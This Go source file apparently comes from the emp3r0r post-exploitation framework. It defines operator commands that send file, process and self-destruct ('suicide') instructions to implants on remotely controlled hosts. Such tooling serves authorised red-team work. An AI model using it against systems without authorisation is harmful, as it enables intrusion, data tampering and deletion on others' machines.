package core

import (
	"fmt"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/lib/cc/internal/agents"
	"github.com/jm33-m0/emp3r0r/core/lib/cc/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/spf13/cobra"
)

func CmdLs(_ *cobra.Command, args []string) {
	dst := "."
	if len(args) != 0 {
		dst = args[0]
	}

	CmdFSCmdDst("ls", dst)
}

func CmdPwd(_ *cobra.Command, _ []string) {
	executeCmd("pwd")
}

func CmdCd(_ *cobra.Command, args []string) {
	activeAgent := agents.MustGetActiveAgent()
	if activeAgent == nil {
		logging.Errorf("cd: no active target")
		return
	}

	dst := args[0]
	activeAgent.CWD = dst
	cmd_id := uuid.NewString()
	err := agents.SendCmdToCurrentTarget(fmt.Sprintf("cd --dst %s", dst), cmd_id)
	if err != nil {
		logging.Errorf("Cannot cd to %s: %v", dst, err)
		return
	}
	// wait for response, max 10s
	for i := 0; i < 100; i++ {
		time.Sleep(100 * time.Millisecond)
		res, exists := def.CmdResults[cmd_id]
		if exists {
			if !strings.Contains(res, "error") {
				logging.Infof("cd: %s", res)
				activeAgent.CWD = res // update CWD to absolute path
			}
			break
		}
	}
}

func CmdCat(_ *cobra.Command, args []string) {
	dst := args[0]
	CmdFSCmdDst("cat", dst)
}

func CmdCp(_ *cobra.Command, args []string) {
	src := args[0]
	dst := args[1]

	CmdFSCmdSrcDst("cp", src, dst)
}

func CmdRm(_ *cobra.Command, args []string) {
	dst := args[0]
	CmdFSCmdDst("rm", dst)
}

func CmdMkdir(_ *cobra.Command, args []string) {
	dst := args[0]
	CmdFSCmdDst("mkdir", dst)
}

func CmdMv(_ *cobra.Command, args []string) {
	src := args[0]
	dst := args[1]
	CmdFSCmdSrcDst("mv", src, dst)
}

func CmdPs(cmd *cobra.Command, args []string) {
	pid, _ := cmd.Flags().GetInt("pid")
	user, _ := cmd.Flags().GetString("user")
	name, _ := cmd.Flags().GetString("name")
	cmdLine, _ := cmd.Flags().GetString("cmdline")

	cmdArgs := "ps"
	if pid != 0 {
		cmdArgs = fmt.Sprintf("%s --pid %d", cmdArgs, pid)
	}
	if user != "" {
		cmdArgs = fmt.Sprintf("%s --user %s", cmdArgs, user)
	}
	if name != "" {
		cmdArgs = fmt.Sprintf("%s --name %s", cmdArgs, name)
	}
	if cmdLine != "" {
		cmdArgs = fmt.Sprintf("%s --cmdline %s", cmdArgs, cmdLine)
	}
	executeCmd(cmdArgs)
}

func CmdNetHelper(_ *cobra.Command, _ []string) {
	executeCmd("net_helper")
}

func CmdSuicide(_ *cobra.Command, _ []string) {
	executeCmd("suicide")
}

func CmdKill(cmd *cobra.Command, args []string) {
	pid := args[0:]
	executeCmd(fmt.Sprintf("kill --pid %v+", strings.Join(pid, " ")))
}

func CmdFSCmdDst(cmd, dst string) {
	executeCmd(fmt.Sprintf("%s --dst '%s'", cmd, dst))
}

func CmdFSCmdSrcDst(cmd, src, dst string) {
	executeCmd(fmt.Sprintf("%s --src '%s' --dst '%s'", cmd, src, dst))
}

func executeCmd(cmd string) {
	activeAgent := agents.MustGetActiveAgent()
	if activeAgent == nil {
		logging.Errorf("%s: no active target", cmd)
		return
	}
	err := agents.SendCmdToCurrentTarget(cmd, "")
	if err != nil {
		logging.Errorf("%s failed: %v", cmd, err)
	}
}
